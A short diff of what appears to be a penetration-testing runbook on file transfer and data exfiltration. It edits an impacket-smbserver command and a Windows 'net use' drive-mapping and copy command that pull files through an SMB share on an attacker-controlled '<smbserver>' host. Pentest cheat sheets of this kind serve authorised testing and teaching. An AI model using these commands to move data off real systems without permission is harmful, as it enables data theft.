@@ -21,11 +21,11 @@ This runbook is to help with file transfering or data exfiltration. Transfering 
 ## SMB Server
 
 ```sh
-impacket-smbserver share . -smb2support -user user -password test1230
+impacket-smbserver share . -smb2support -user user -password test123
 ```
 
 ```cmd
-net use z:\ \\<smbserver>\share /USER:user test123
+net use z: \\<smbserver>\share /USER:user test123
 copy z:\ .
 ```
 
